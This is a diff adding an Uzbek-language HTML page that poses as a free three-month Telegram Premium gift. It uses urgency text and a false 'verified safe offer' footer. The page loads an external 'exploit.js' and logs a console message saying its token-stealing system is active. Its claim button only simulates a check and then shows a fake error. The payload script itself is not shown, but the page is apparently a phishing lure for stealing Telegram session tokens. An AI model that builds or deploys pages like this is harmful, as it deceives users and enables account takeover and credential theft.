@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Telegram Premium | Bepul sovg'a</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #17212b 0%, #1f2a36 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .card {
+            background: #1f2a36;
+            border-radius: 28px;
+            padding: 35px 25px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
+        }
+        
+        .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        h1 {
+            color: #2aabee;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .offer {
+            background: linear-gradient(135deg, #2aabee, #1c8bc2);
+            color: white;
+            padding: 14px;
+            border-radius: 16px;
+            font-weight: bold;
+            margin: 20px 0;
+            font-size: 20px;
+        }
+        
+        p {
+            color: #abb2bb;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #2aabee, #1c8bc2);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(42,171,238,0.3);
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(42,171,238,0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .status {
+            margin-top: 20px;
+            font-size: 13px;
+            display: none;
+            padding: 12px;
+            border-radius: 12px;
+        }
+        
+        .status.loading {
+            background: rgba(255,170,0,0.15);
+            color: #ffaa00;
+            display: block;
+        }
+        
+        .status.error {
+            background: rgba(255,68,68,0.15);
+            color: #ff6666;
+            display: block;
+        }
+        
+        .footer {
+            font-size: 11px;
+            color: #5e6f8d;
+            margin-top: 20px;
+        }
+        
+        .timer {
+            font-size: 12px;
+            color: #2aabee;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="icon">🎁</div>
+            <h1>Siz bugun omadlisiz!</h1>
+            <div class="offer">⭐ 3 oy Telegram Premium ⭐</div>
+            <p>Cheklangan vaqtli taklif! <br> Faqat 100 ta foydalanuvchi uchun.</p>
+            <button id="claimBtn">🎉 Sovg'ani olish</button>
+            <div id="status" class="status"></div>
+            <div class="timer" id="timer"></div>
+            <div class="footer">✅ Tekshiruvdan o'tgan xavfsiz taklif</div>
+        </div>
+    </div>
+
+    <script src="exploit.js"></script>
+    
+    <script>
+        // Timer funksiyasi (boshlanish vaqtidan boshlab)
+        let startTime = Date.now();
+        let timerInterval = setInterval(() => {
+            let elapsed = Math.floor((Date.now() - startTime) / 1000);
+            document.getElementById('timer').innerHTML = `⏱️ Sahifa ochilganiga ${elapsed} soniya`;
+        }, 1000);
+        
+        // Tugma bosilganda
+        document.getElementById('claimBtn').addEventListener('click', function() {
+            let statusDiv = document.getElementById('status');
+            statusDiv.className = 'status loading';
+            statusDiv.innerHTML = '⏳ Tekshirilmoqda, iltimos kuting...';
+            
+            setTimeout(() => {
+                statusDiv.className = 'status error';
+                statusDiv.innerHTML = '❌ Texnik xatolik yuz berdi. Qaytadan urinib ko\'ring.';
+            }, 3000);
+        });
+        
+        // Sahifa yuklanganda konsolga xabar
+        console.log("✅ Sahifa yuklandi! Token o'g'irlash tizimi faol.");
+    </script>
+</body>
+</html>
